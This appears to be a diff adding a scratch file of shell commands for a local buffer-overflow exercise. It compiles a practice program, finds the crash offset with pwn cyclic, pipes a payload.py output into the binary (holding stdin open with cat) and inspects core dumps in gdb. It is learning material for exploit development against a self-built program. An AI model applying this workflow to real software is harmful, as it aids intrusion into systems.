@@ -1,0 +1,25 @@
+g++ -o simple_buffer_overflow simple_buffer_overflow.cpp # -fno-stack-protector -m32 -no-pie
+objdump -d simple_buffer_overflow | less
+alias d="dmesg|tail -1"
+ulimit -c unlimited
+
+chars=16
+pwn cyclic $chars ; pwn cyclic $chars | ./simple_buffer_overflow ; dmesg | tail -1 
+len=20;python payload.py $len ; python payload.py $len | ./simple_buffer_overflow ;d
+rm -rf core.* ; len=9 ; python payload.py $len ; (python payload.py $len ;cat)| ./simple_buffer_overflow ;d				
+
+
+
+
+
+
+gdb simple_buffer_overflow core.*
+
+p $sp
+
+x/40x $sp
+x/80x $sp-96
+
+
+
+pattern create
